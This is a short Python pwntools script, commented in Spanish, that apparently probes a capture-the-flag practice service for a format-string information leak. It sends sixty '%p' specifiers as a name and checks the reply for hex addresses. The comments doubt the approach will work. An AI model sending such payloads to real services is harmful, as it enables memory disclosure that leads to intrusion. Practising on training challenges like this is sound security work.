#!/usr/bin/env python3

from pwn import *

# Intentar leak usando format string si es posible
# Pero ya sabemos que printf usa "%s\n" fijo

# Otra idea: si sobrescribo usr con caracteres especiales,
# quizás printf revela algo

conn = remote('svc.pwnable.xyz', 30004)

conn.recvuntil(b'[y/N]: ')
conn.send(b'y\n')

conn.recvuntil(b'Name: ')

# Enviar %p%p%p...
payload = b'%p' * 60

conn.sendline(payload)

data = conn.recvall(timeout=3)
log.info(f"Respuesta: {data}")

# Buscar direcciones hex
if b'0x' in data:
    log.success("¡Hay leak de direcciones!")

conn.close()